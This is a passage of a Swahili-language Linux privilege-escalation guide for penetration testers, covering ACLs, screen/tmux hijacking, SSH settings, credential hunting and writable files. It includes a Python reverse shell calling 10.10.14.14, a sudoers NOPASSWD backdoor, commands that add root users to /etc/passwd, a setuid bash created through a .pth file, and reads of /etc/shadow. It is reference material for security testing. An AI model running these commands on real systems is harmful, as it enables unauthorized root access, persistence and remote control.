 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities hutoa **sehemu ndogo ya ruhusa za root zinazopatikana kwa mchakato**. Hii hugawa **ruhusa za root katika vitengo vidogo na tofauti**. Kila kitengo kinaweza kisha kupewa michakato kivyake. Kwa njia hii, seti nzima ya ruhusa hupunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

Katika directory, **bit ya "execute"** humaanisha kuwa mtumiaji husika anaweza kutumia "**cd**" kuingia kwenye folder.\
Bit ya **"read"** humaanisha kuwa mtumiaji anaweza kuorodhesha **files**, na bit ya **"write"** humaanisha kuwa anaweza kufuta na kuunda **files** mpya.

## ACLs

Access Control Lists (ACLs) ni safu ya pili ya ruhusa za hiari, zenye uwezo wa **kubatilisha ruhusa za jadi za ugo/rwx**. Ruhusa hizi huboresha udhibiti wa ufikiaji wa file au directory kwa kuruhusu au kukataa haki kwa watumiaji mahususi ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha **uchanganuzi wa kina huhakikisha usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanapatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Mpe** mtumiaji "kali" ruhusa za kusoma na kuandika file:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pata** faili zenye ACL maalum kutoka kwenye mfumo:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ya ACL iliyofichwa kwenye drop-in za sudoers

Upotoshaji wa kawaida wa mipangilio ni faili inayomilikiwa na root ndani ya `/etc/sudoers.d/` yenye mode `440`, lakini bado inampa mtumiaji mwenye ruhusa za chini ufikiaji wa kuandika kupitia ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Ukiona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sheria ya sudo licha ya bits za ruhusa zilizowekewa vizuizi:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Hii ni njia yenye athari kubwa ya persistence/privesc kupitia ACL, kwa sababu ni rahisi kuikosa unapokagua kwa kutumia `ls -l` pekee.

## Vikao vya shell vilivyo wazi

Ufikiaji wa GNU Screen wa watumiaji wengine hutegemea **usanidi na ACL za kikao kinachoendeshwa**, si toleo lake pekee. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) kwamba lazima ijengwe kwa msaada wa multiuser; `multiuser on` na ruhusa ya `acladd` au `aclchg` inayofaa huruhusu mtumiaji mwingine kujiunga. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) kwa ajili ya utafutaji wa vikao vya watumiaji wengine. Socket inayoonekana inayomilikiwa na root au binary ya `screen` yenye SUID pekee haithibitishi kwamba kuna shell ya root inayoweza kujiungiwa. Thibitisha kuwa kikao kinachoendelea ni multiuser, mtumiaji wa sasa ana ruhusa halisi ya kuingiza amri au kutekeleza amri, na shell katika kikao hicho inaendeshwa na mmiliki mwenye upendeleo kabla ya kukichukulia kama njia ya escalation.

### screen sessions hijacking

**Orodhesha vikao vya screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Kutekwa kwa vipindi vya screen - Maeneo ya socket (baadhi ya mifumo hufichua moja kama symlink ya nyingine): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Unganisha kwenye kipindi**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Hili lilikuwa tatizo katika **matoleo ya zamani ya tmux**. Sikuweza kuteka session ya tmux (v2.1) iliyoundwa na root nikiwa mtumiaji asiye na mapendeleo.

**Orodhesha sessions za tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Maeneo ya socket (baadhi ya mifumo hufichua moja kama symlink ya nyingine) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Orodhesha kwa kutumia socket hiyo, unaweza kuanzisha session ya tmux kwenye socket hiyo...](<../../images/image (837).png>)

**Ambatisha kwenye session**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Keys zilizozalishwa kwa OpenSSL builds zilizoathirika za Debian au derivatives katika kipindi cha kihistoria cha udhaifu zinaweza kuwa na randomness inayotabirika; distribution ya sasa ya host au toleo la OpenSSL lililofanyiwa patch halithibitishi jinsi key ya zamani ilivyozalishwa. Kagua **key husika** dhidi ya blacklist inayofaa ya kihistoria na chanzo chake. Mwongozo wa Debian wa [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) unaeleza jinsi ya kukagua public keys na `authorized_keys`, na [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) inaandika marekebisho ya OpenSSL. Entry katika `authorized_keys` ya akaunti yenye privileged ni njia ya kufuatilia escalation tu ikiwa private key inayolingana inaweza kupatikana tena na sera halisi ya SSH bado inakubali key hiyo kwa akaunti hiyo; **host** key dhaifu yenyewe si credential ya login. Badilisha keys zilizoathirika na uondoe authorizations zake za zamani.

### SSH Interesting configuration values

- **PasswordAuthentication:** Hubainisha kama password authentication inaruhusiwa. Default ya upstream OpenSSH ni `yes`; configuration ya distribution inaweza kuibadilisha.
- **PubkeyAuthentication:** Hubainisha kama public key authentication inaruhusiwa. Default ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, hubainisha kama server inaruhusu login kwenye akaunti zenye password string tupu. Default ni `no`.

### Login control files

Files hizi huathiri nani anaweza kufanya login na jinsi:

- **`/etc/nologin`**: ikiwa ipo, huzuia login za wasio-root na kuonyesha ujumbe wake.
- **`/etc/securetty`**: huzuia mahali ambapo root anaweza kufanya login (TTY allowlist).
- **`/etc/motd`**: banner inayoonyeshwa baada ya login (inaweza kuvuja maelezo ya mazingira au matengenezo).

### PermitRootLogin

Hubainisha kama root anaweza kufanya login kwa kutumia ssh. Default ya upstream OpenSSH ni `prohibit-password`; configuration ya distribution inaweza kuibadilisha. Thamani zinazowezekana:

- `yes`: root anaweza kufanya login kwa kutumia password na private key
- `without-password` au `prohibit-password`: root anaweza kufanya login kwa kutumia private key pekee
- `forced-commands-only`: Root anaweza kufanya login kwa kutumia private key pekee, na ikiwa options za commands zimebainishwa
- `no` : hapana

### Trusted SSH user certificate authorities

`TrustedUserCAKeys` hutaja public keys ambazo sshd inaziamini kusaini certificates za **user**. Ikiwa private CA key inayolingana inaweza kusomwa na user mwenye privileges za chini, kagua nani anaweza kupata certificate na ni account principals zipi zinaweza kuthibitishwa nayo. `AuthorizedPrincipalsFile` au `AuthorizedPrincipalsCommand` zinaweza kuzuia majina yanayokubaliwa; ikiwa hakuna iliyosanidiwa, certificate lazima iwe na jina la account lengwa. `PermitRootLogin prohibit-password` huzuia root password authentication lakini bado inaweza kuruhusu certificate authentication. Path ya key iliyo wazi pekee haithibitishi access: thibitisha jozi ya public/private key, rules halisi za `Match`, sera ya account, key passphrase, revocation, na signature algorithms zinazokubaliwa. Usijumuishe bytes za private-key katika matokeo ya enumeration. Tazama [mwongozo wa configuration ya OpenSSH server](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Private CA key pia inaweza kutumika **bila kusomeka** na user wa sasa ikiwa rule ya privilege-delegation inamruhusu user huyo kutumia certificate signer isiyo na vizuizi [kama `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) kwa utambulisho wa mmiliki wa key. Linganisha command na arguments zinazoruhusiwa hasa na access ya akaunti ya signer kwa key, CA public key inayoaminika na configuration halisi ya sshd, principal inayokubaliwa kwa account lengwa, uhalali wa certificate, na sera ya login ya akaunti hiyo. Command ya signer iliyokabidhiwa au CA file inayoaminika pekee havithibitishi access kwa akaunti nyingine; usisaini test certificate wakati wa passive enumeration.

### AuthorizedKeysFile

Hubainisha files zilizo na public keys zinazoweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na home directory. **Unaweza kubainisha absolute paths** (zinazoanza na `/`) au **relative paths kutoka home directory ya user**. Kwa mfano:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Mipangilio hiyo itaonyesha kuwa ukijaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Uelekezaji wa SSH agent hukuwezesha **kutumia SSH keys zako za ndani badala ya kuacha keys** (bila passphrases!) kwenye server yako. Kwa hiyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda kwenye host nyingine** **kwa kutumia** **key** iliyo kwenye **host yako ya awali**.

Unahitaji kuweka chaguo hili kwenye `$HOME/.ssh.config` hivi:

```
Host example.com
  ForwardAgent yes
```

Notice kwamba ikiwa `Host` ni `*`, kila mtumiaji anapohamia kwenye mashine tofauti, mashine hiyo itaweza kufikia keys (jambo linalohatarisha usalama).

Faili `/etc/ssh_config` inaweza **kubatilisha** **chaguo** hizi na kuruhusu au kukataza usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataza** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (kwa chaguo-msingi inaruhusiwa).

Ukigundua kuwa Forward Agent imesanidiwa kwenye mazingira, soma ukurasa ufuatao kwa kuwa **huenda ukaweza kuitumia vibaya ili kuongeza privileges**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za Profiles

Faili `/etc/profile` na faili zilizo ndani ya `/etc/profile.d/` ni **scripts zinazoendeshwa mtumiaji anapofungua shell mpya**. Kwa hivyo, ukiweza **kuandika au kurekebisha mojawapo, unaweza kuongeza privileges**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ikiwa utapata script yoyote ya profile isiyo ya kawaida, unapaswa kuikagua ili kuona kama ina **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` huenda zikatumia majina tofauti au kukawa na nakala rudufu. Kwa hivyo, inapendekezwa **uzitafute zote** na **uangalie kama unaweza kuzisoma** ili kuona **kama zina hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Katika baadhi ya hali unaweza kupata **password hashes** ndani ya faili la `/etc/passwd` (au faili linganishi)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd inayoweza kuandikwa

Kwanza, tengeneza nenosiri kwa kutumia mojawapo ya amri zifuatazo.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Kisha ongeza mtumiaji `hacker` na uweke nenosiri lililotengenezwa.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

KUMBUKA: Kwenye mifumo ya BSD, `/etc/passwd` hupatikana katika `/etc/pwd.db` na `/etc/master.passwd`; pia, `/etc/shadow` hubadilishwa jina na kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye **faili fulani ya usanidi wa huduma**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor yako itatekelezwa Tomcat itakapoanzishwa tena.

### Kagua Folda

Folda zifuatazo zinaweza kuwa na nakala rudufu au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho, lakini jaribu)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Mahali Pasipo pa Kawaida/Mafaili Yanayomilikiwa

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Faili zilizorekebishwa katika dakika za hivi karibuni

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Faili za DB za SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Kwa database za programu zinazosomeka, kagua majina ya majedwali na safu wima ili kupata majina ya watumiaji na password hashes. Kupata hash, kurejesha password yake, na kuthibitisha kuwa imetumika tena kwa akaunti ya ndani ni hatua tofauti; mfuatano wa kawaida wa herufi za hexadecimal wenye urefu wa herufi 32 hautoshi kubaini kuwa ni MD5 au kuthibitisha ufikiaji wa akaunti.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Ikiwa historia ya shell inayosomeka ina amri ya `sudo` ikifuatiwa na mstari mfupi unaofanana na nenosiri, kagua mwenyewe mistari inayoizunguka. Nenosiri lililoingizwa kwenye kidokezo cha kawaida cha `sudo` halihifadhiwi kwenye historia ya shell; mstari unaofuata ni ingizo linalowezekana kuingizwa kwenye shell kimakosa, si uthibitisho wa nenosiri halali. Alama ya `.sudo_as_admin_successful` hurekodi matumizi ya awali, si idhini ya sasa.

### Faili zilizofichwa

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Binaries katika PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Faili za wavuti**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Nakala rudufu**

Kagua faili zinazosomeka ndani ya saraka za nakala rudufu, pamoja na faili ambazo **majina** yake yana neno `backup`: jalada lenye jina lisiloeleweka au kiendelezi kilichosimbwa kwa njia fiche bado linaweza kufichua data ya zamani ya programu. Jalada lililosimbwa kwa njia fiche ni mgombea tu wa kufichua taarifa. Kurejesha password, kukagua yaliyomo, kurejesha hash ya programu, na kutumia tena password hiyo kwa akaunti ya Unix ni hatua tofauti zinazohitaji kuthibitishwa; hash iliyo kwenye jalada haithibitishi kuwa kuna uwezekano wa kuingia kwenye mfumo wa ndani.

Nakala rudufu za mashine pepe zinazosomeka zinahitaji ukaguzi huohuo. Faili ya usanidi ya VirtualBox `.vbox` inaweza kutambua picha za `.vdi` zilizounganishwa na kuwa na metadata ya ufunguo wa diski iliyosimbwa kwa njia fiche; [VirtualBox inaeleza kuwa ufunguo wa data uliosimbwa kwa njia fiche huhifadhiwa kwenye usanidi wa VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Usanidi na picha lazima zote ziweze kufikiwa kabla ya kukagua diski nje ya mfumo. Volume ya mfumo-mgeni inaweza kuwa na [tabaka lake la usimbaji fiche la LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), linalohitaji ufunguo tofauti. Hata baada ya kusimbua kwa njia iliyoidhinishwa, script au usanidi wa zamani unaweza kuwa na password; thibitisha kuwa kitambulisho hicho bado kinatumika kwa akaunti ya host na kwamba sera yake ya `sudo` inaruhusu kutekeleza amri yenye ruhusa za juu kabla ya kuita hali hii escalation ya ndani. Wakati wa enumeration tulivu, orodhesha njia na ruhusa bila kunakili, kusimbua, au ku-mount picha.

Unapokagua jalada linalosomeka, orodhesha majina ya vipengee vilivyomo kabla ya kutoa chochote: huenda kukawa na faili fiche za uthibitishaji, nyenzo za recovery code, au funguo za SSH hata kama nakala zinazotumika zinalindwa. Majina ya faili yanaonyesha tu kidokezo; thibitisha nyenzo na matumizi tena ya akaunti kando.

Tanguliza **majala yanayosomeka yanayomilikiwa na mtumiaji mwingine** ndani ya saraka za nakala rudufu, hasa majala yanayomilikiwa na root na yale yanayoweza kufikiwa kupitia uanachama wa group. Jalada la zamani linaweza kuwa na usanidi au siri ya uthibitishaji hata kama nakala inayotumika inalindwa. Kwa UI ya nakala rudufu ya ndani kama [Backrest](https://garethgeorge.github.io/backrest/), angalia akaunti halisi inayotumiwa na service na iwapo mtumiaji mwenye ruhusa za chini anaweza kusoma usanidi wake au kujithibitisha kwenye UI. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) zake na [kiolesura cha amri cha restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) vinaweza kutumia ruhusa za faili na amri za daemon; listener ya loopback peke yake haiainishi athari. `passwordBcrypt` ya Backrest ni hash ya bcrypt iliyosimbwa kwa base64 katika [msimbo wake wa uthibitishaji](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), si password ya maandishi wazi. Thibitisha utambulisho wa service, vitambulisho vinavyoweza kutumika, na ufikiaji wa plan au repository husika kabla ya kuchukulia jalada au UI iliyofichuliwa kama mpaka wa ruhusa.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Faili zinazojulikana kuwa na passwords

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); inatafuta **faili kadhaa zinazoweza kuwa na passwords**.\
**Tool nyingine ya kuvutia** unayoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), programu ya open source inayotumika kupata passwords nyingi zilizohifadhiwa kwenye kompyuta ya ndani ya Windows, Linux na Mac.

Ikiwa `/etc/guacamole/guacamole.properties` inasomeka, kagua mipangilio yake ya muunganisho wa database ya `mysql-*`, `postgresql-*` au `sqlserver-*`. Ikiwa akaunti imeidhinishwa kusoma majedwali ya Guacamole JDBC, `guacamole_connection_parameter` inaweza kuwa na thamani zilizohifadhiwa za SSH za `username`, `password`, `private-key` au `passphrase`. Anza kwa kuangalia connection IDs na majina ya parameter, kisha kagua safu zinazohusika pekee; thamani iliyohifadhiwa inaweza kuwa token inayobadilika au rejeleo la vault badala ya secret inayoweza kutumika tena. Tazama [muundo wa Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) na [parameter za muunganisho wa SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Database ya kawaida ya pswm password manager](https://github.com/Julynx/pswm#usage) huhifadhi vault iliyosimbwa kwa njia fiche kwenye `~/.local/share/pswm/pswm` kwa chaguo-msingi. Ikiwa vault ya mtumiaji mwingine inaonekana, kagua umiliki wake na kama akaunti yako inaweza kuisoma kweli. Njia ya vault pekee haifichui credentials; kupata master password yake, kutafuta password ya akaunti inayoweza kutumika tena, na kuthibitisha privileges za akaunti hiyo ni hatua tofauti.

[Database ya kawaida ya Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) ni `~/.passpie/`, ikiwa na keyring ya `.keys` na faili za credentials za `.pass` zilizosimbwa kwa njia fiche ndani ya group directories. Kuonekana kwa directory ya database ni kidokezo cha njia tu: thibitisha uwezo wa kufikia key na ingizo husika lililosimbwa, kama master passphrase inahitajika, na kama credential iliyopatikana ni ya akaunti yenye privileges zaidi. Passpie pia inaruhusu [njia maalum za database](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), kwa hiyo njia ya chaguo-msingi haijumuishi kila kitu. Uhesabuji wa kiotomatiki unapaswa kuorodhesha metadata bila kuhamisha credentials au kuchapisha key material.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yake**. Kadiri log inavyokuwa ya ajabu, ndivyo itakavyokuwa ya kuvutia zaidi (huenda).\
Pia, baadhi ya **audit logs** zilizosanidiwa "**vibaya**" (zilizowekewa backdoor?) zinaweza kukuruhusu **kurekodi passwords** ndani ya audit logs kama ilivyoelezwa kwenye chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Ili **kusoma logs, kundi** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) litakuwa na manufaa sana.

### Faili za Shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Utafutaji wa jumla wa Creds/Regex

Unapaswa pia kutafuta faili zenye neno "**password**" kwenye **jina** lake au ndani ya **maudhui**, na pia utafute IP na barua pepe ndani ya logs, au regex za hashes.\
Sitaorodhesha hapa jinsi ya kufanya yote haya, lakini ukiwa na hamu unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **wapi** script ya python itatekelezwa na **unaweza kuandika ndani** ya folda hiyo au unaweza **kurekebisha maktaba za python**, unaweza kurekebisha maktaba ya OS na kuiwekea backdoor (ikiwa unaweza kuandika kwenye eneo ambalo script ya python itatekelezwa, nakili na ubandike maktaba ya os.py).

Ili **kuwekea maktaba backdoor**, ongeza tu mstari ufuatao mwishoni mwa maktaba ya os.py (badilisha IP na PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` inayoweza kuandikwa na kuchakatwa na `site.addsitedir()`

Usichukulie `site.addsitedir(DIR)` kuwa sawa na `sys.path.append(DIR)`. Pia huchakata kila faili la `*.pth` lililo kwenye `DIR`. Mstari unaoanza na `import` ikifuatiwa na nafasi au tab hutekelezwa kama msimbo wa Python. Mistari ya njia badala yake hutatuliwa kulingana na saraka ya site na huongezwa tu ikiwa njia hizo zipo.<sup>[[38]](#references)</sup>

Hali hii husababisha privilege escalation pale programu ya Python iliyoidhinishwa na sudo au yenye mamlaka ya juu kwa njia nyingine inapoitisha `site.addsitedir()` kwenye saraka inayoweza kuandikwa na mtumiaji wa sasa au mojawapo ya makundi yake. Msimbo wa `.pth` huendeshwa wakati programu yenye mamlaka ya juu inaweka njia yake ya uingizaji, kabla ya kutekeleza kitendo chake cha kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Maudhui yanayotekelezeka ya `.pth` lazima yawe kwenye mstari mmoja, lakini semikoloni huruhusu kauli kadhaa. Kwa mfano, njia ya utekelezaji ya root inaweza kuunda nakala ya Bash yenye setuid; iendeshe Bash kwa `-p` ili ihifadhi effective ID yake.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Chaguo la `-S` huzima tu uanzishaji wa kiotomatiki wa `site` na Python. Halilindi programu inayoingiza `site` moja kwa moja na kuita `site.addsitedir()`. Ondoa directory zinazoweza kuandikiwa na mshambuliaji kwenye njia za import zenye upendeleo, na hakikisha directory na faili zake za `.pth` zinamilikiwa na msimamizi mwenye upendeleo pekee na ni yeye tu anayeweza kuziandikia.<sup>[[38]](#references)[[39]](#references)</sup>

### Unyonyaji wa logrotate

Kazi ya `logrotate` yenye upendeleo inaweza kuunda njia ya kuandika faili kati ya watumiaji pale tu inapozungusha logi iliyo ndani ya directory ambayo mtumiaji mwenye upendeleo mdogo anaweza kubadilisha au kuelekeza kwingine wakati wa mzunguko. Logi inayoweza kuandikwa pekee ni dalili ya kuchunguza. Thibitisha kanuni halisi inayotumika na maagizo yake ya `create`, `olddir`, na `su`; utambulisho unaotumika wa scheduler; ruhusa za kuandika na kutafuta kwenye directory kuu ya logi; na kama toleo lililosakinishwa pamoja na sera zinaruhusu kubadilisha mahali pa faili. Shell yenye upendeleo itakayofunguliwa baadaye lazima pia ipakie faili iliyotokana na mabadiliko ili uandishi kwenye faili ya kuanzisha programu uweze kusababisha utekelezaji wa amri. Kagua ratiba, kanuni, toleo/ufungashaji na metadata ya njia bila kusababisha mzunguko au kujaribu race.

> [!TIP]
> Usichukulie `3.18.0` au nambari yoyote ya toleo pekee kuwa kigezo cha kubaini kama kuna uwezekano wa exploit. [Rekodi ya mabadiliko ya upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) inaonyesha kuwa uimarishaji dhidi ya matatizo ya directory na symlink ulifanywa katika matoleo kadhaa, na usambazaji unaweza kuwa umeweka marekebisho hayo katika matoleo ya zamani. [Mwongozo wa upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) unapendekeza kutumia `su` wakati root inazungusha logi kwenye directory zinazodhibitiwa na watumiaji wasio na upendeleo; thibitisha kanuni inayotumika na tabia halisi.

Maelezo zaidi kuhusu udhaifu huu yanapatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Unaweza ku-exploit udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

